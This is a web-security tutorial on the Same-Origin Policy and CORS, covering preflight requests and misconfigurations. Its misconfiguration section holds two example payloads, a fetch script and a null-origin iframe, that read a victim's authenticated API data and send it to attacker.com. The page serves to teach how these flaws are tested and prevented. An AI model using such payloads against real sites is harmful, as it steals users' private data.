---
title: "Same-Origin Policy and CORS"
topic: "sop-cors"
tags: [sop, cors, web-security, same-origin-policy, http-headers, browser-security]
difficulty: intermediate
day: 32
layout: default
parent: Topics
nav_order: 32
---

# Same-Origin Policy and CORS

## What You Will Learn
- What the Same-Origin Policy (SOP) is and why browsers enforce it
- What CORS is and how it relaxes the SOP
- How CORS misconfigurations can be exploited
- How to identify and test CORS vulnerabilities

## Same-Origin Policy (SOP)

The Same-Origin Policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin. It helps isolate potentially malicious documents, reducing possible attack vectors.

Two URLs have the same origin if the **protocol**, **port** (if specified), and **host** are the same for both. URLs that do not meet these requirements are restricted from sharing resources — the response from another domain would be inaccessible from a browser on a different domain.

To be clear: a request made from a different domain is usually **sent**, but the **response** is inaccessible. Also, this only applies in the browser — it will not prevent attacks like CSRF by default unless the developer configures protections.

Tricking a visitor into making a request to another domain on your behalf would succeed, but the response from that domain would be inaccessible. This still leaves room for DDoS and making requests to the target website on behalf of the victim.

In some situations developers explicitly tell the browser which HTTP methods are permitted. In that case, the browser first sends a **preflight OPTIONS** request to check which methods are allowed via CORS. The server replies whether the method is allowed — if not, the entire request fails.

## CORS

**Cross-Origin Resource Sharing (CORS)** is an HTTP-header-based mechanism that allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources.

There are cases where legitimate websites want to access their resources across different domains. For example, the backend application may be hosted on a different subdomain or domain entirely, and the frontend application needs to access these resources. This would normally be impossible due to SOP, but CORS provides a controlled way to relax these restrictions.

### CORS Response Headers

```
Access-Control-Allow-Origin: https://trusted.example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

### CORS Preflight Request

For non-simple requests, the browser sends a preflight:

```http
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://frontend.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

Server response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Content-Type
```

## CORS Misconfigurations

### Reflecting the Origin

If a server reflects the `Origin` header directly back without validation:

```http
GET /api/secret HTTP/1.1
Host: api.victim.com
Origin: https://attacker.com
```

Response:

```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

An attacker can steal sensitive data with a script like:

```js
fetch('https://api.victim.com/api/secret', { credentials: 'include' })
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/steal?d=' + btoa(data)));
```

### Null Origin

Some servers allow the `null` origin, which can be triggered from sandboxed iframes:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
          fetch('https://api.victim.com/secret', {credentials: 'include'})
            .then(r => r.json())
            .then(d => location='https://attacker.com/?data=' + JSON.stringify(d));
        </script>">
</iframe>
```

## Resources

- [PortSwigger — CORS](https://portswigger.net/web-security/cors)
- [MDN — Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
- [Security StackExchange — When does SOP prevent a request?](https://security.stackexchange.com/questions/145013/when-does-the-same-origin-policy-prevent-a-request-from-being-sent)
- [TryHackMe — CORS](https://tryhackme.com/room/cors)
